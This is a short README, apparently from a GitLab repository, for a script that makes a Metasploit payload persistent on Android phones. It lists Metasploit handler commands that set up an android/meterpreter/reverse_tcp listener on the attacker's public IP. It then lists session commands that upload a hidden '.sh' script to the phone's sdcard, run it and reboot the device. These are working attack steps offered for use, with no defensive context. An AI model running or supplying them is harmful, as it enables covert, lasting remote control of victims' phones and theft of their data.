# MSF PERSISTANCE ANDROID

## INDEX

- [MSF PERSISTANCE ANDROID](#msf-persistance-android)
  - [INDEX](#index)
  - [BADGES](#badges)
  - [FIRST UPDATE](#first-update)
  - [INTRODUCTION](#introduction)
  - [PREREQUISITES](#prerequisites)
  - [USE](#use)
  - [LICENSE](#license)

## BADGES

[![pipeline status](https://gitlab.com/oda-alexandre/msf-persistance-android/badges/master/pipeline.svg)](https://gitlab.com/oda-alexandre/msf-persistance-android/commits/master)

## FIRST UPDATE

Date: 01-01-01

## INTRODUCTION

This script allows the persistence of the payload on Android smartphone with Metasploit.

## PREREQUISITES

Use [Metasploit](https://www.metasploit.com/)

## USE

1 - Put the msf-persistance-android.sh script in your personal folder and rename .sh

2 - Open MSF

```use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost YOUR IP PUBLIC
set lport THE PORT OF YOUR CHOICE
exploit
```

3 - Copie/Paste in a terminal in shell MSF with a session android/meterpreter/reverse_tcp

```cd /
cd sdcard
upload ~/.sh
shell
cd /
cd sdcard
sh .sh
reboot
exit
```

## LICENSE

[![GPLv3+](http://gplv3.fsf.org/gplv3-127x51.png)](https://gitlab.com/oda-alexandre/msf-persistance-android/blob/master/LICENSE)
